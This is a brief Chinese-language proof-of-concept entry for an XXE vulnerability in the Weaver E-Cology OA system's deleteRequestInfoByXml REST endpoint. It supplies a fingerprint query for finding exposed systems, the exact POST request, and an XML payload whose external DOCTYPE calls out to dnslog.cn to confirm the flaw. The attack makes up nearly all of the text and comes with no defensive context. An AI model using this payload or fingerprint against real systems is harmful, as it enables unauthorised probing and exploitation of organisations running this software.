# 泛微E-Cology系统deleteRequestInfoByXml存在XXE漏洞

泛微OA ｜ XXE ｜ —
- **指纹**：`app="泛微-协同商务系统"`
- **请求**：`POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://dnslog.cn/aa">
<M><syscode>&send;</syscode></M>
```
- **响应特征**：200